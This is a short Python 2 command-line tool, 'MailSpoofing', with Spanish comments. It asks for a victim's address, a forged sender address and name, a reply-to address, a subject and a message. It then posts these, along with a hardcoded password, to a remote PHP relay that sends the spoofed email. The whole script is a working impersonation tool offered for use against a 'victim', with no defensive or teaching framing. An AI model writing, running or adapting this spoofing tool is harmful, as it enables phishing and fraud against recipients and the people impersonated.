#!/usr/bin/python
#-*- coding:UTF-8 -*-

from bs4 import BeautifulSoup
import requests
import httplib
import urllib
from termcolor import colored
from time import sleep
from clint.textui import progress  

# Mensaje de inicio
print colored("""
                  ╔═╗╔═╗   ╔╗ ╔═══╗         ╔═╗
                  ║║╚╝║║   ║║ ║╔═╗║         ║╔╝
                  ║╔╗╔╗╠══╦╣║ ║╚══╦══╦══╦══╦╝╚╦╦═╗╔══╗
                  ║║║║║║╔╗╠╣║ ╚══╗║╔╗║╔╗║╔╗╠╗╔╬╣╔╗╣╔╗║
                  ║║║║║║╔╗║║╚╗║╚═╝║╚╝║╚╝║╚╝║║║║║║║║╚╝║
                  ╚╝╚╝╚╩╝╚╩╩═╝╚═══╣╔═╩══╩══╝╚╝╚╩╝╚╩═╗║
                                  ║║              ╔═╝║
                                  ╚╝              ╚══╝
                            v1.0 by @unkndown
""","blue", attrs=['bold'])
# opciones
print colored(" Suplantacion de email o Mail Spoofing: \n\n -Email victima: email de quien recibira el correo \n -Email a suplantar: email falso que enviara el correo \n -Email de respuesta: email que recibira la respuesta de la victima \n -Nombre a suplantar: nombre falso que enviara el correo\n", "magenta", attrs=['bold'])

# Iniciamos la ejecucion
try:

	#
	# Obtenemos el rut a partir del dato que nos de el usuario
	#

	# email de la victima
	victima = raw_input(" Email victima: ")
	print " "
	# email a suplantar
	email   = raw_input(" Email a suplantar: ")
	print " "
	# email de respuesta
	respuesta   = raw_input(" Email de respuesta: ")
	print " "
	# nombre suplantado
	nombre  = raw_input(" Nombre a suplantar: ")
	print " "
	# asunto del mensaje
	asunto  = raw_input(" Asunto del mensaje: ")
	print " "
	# contenido del mensaje
	mensaje = raw_input(" Mensaje: ")
	# Mostrar mensaje de enviando
	print colored(" \n [+] Enviando mensaje \n","green",attrs=['bold'])
	# webservice
	link       = "http://crazyfrases.hol.es/mail.php"
	# host
	host       = "crazyfrases.hol.es:80"
	# definimos parametros que se enviaran por post
	parametros = urllib.urlencode({'victima':victima,'suplantacion':email,'nombre':nombre,'respuesta':respuesta,'asunto':asunto,'mensaje':mensaje,'password':'hackingcl'})
	# definimos los headers que se enviaran
	headers    = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0","Accept-Language": "es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3","Referer":link}
	# definimos nuestra conexion
	conexion   = httplib.HTTPConnection(host)
	# enviamos la peticion
	conexion.request("POST", link, parametros, headers)
	# obtenemos la respuesta
	respuesta  = conexion.getresponse()
	# barra de progreso
	for i in progress.bar(range(100)):
		sleep(0.1 * 0.2)
	# verificamos la conexion
	if respuesta.status == 200:
		# Mostrar mensaje de exito
		print colored(" \n [+] Mensaje Enviando \n","green",attrs=['bold'])
	else:
		# Mostrar mensaje error
		print colored(" \n [-] Error al enviar mensaje \n","red",attrs=['bold'])

# Si cancela la ejecucion, mostramos un mensaje de despedida
except KeyboardInterrupt:
	print colored("\n\n Ejecucion cancelada, hasta la proxima\n","red",attrs=['bold'])
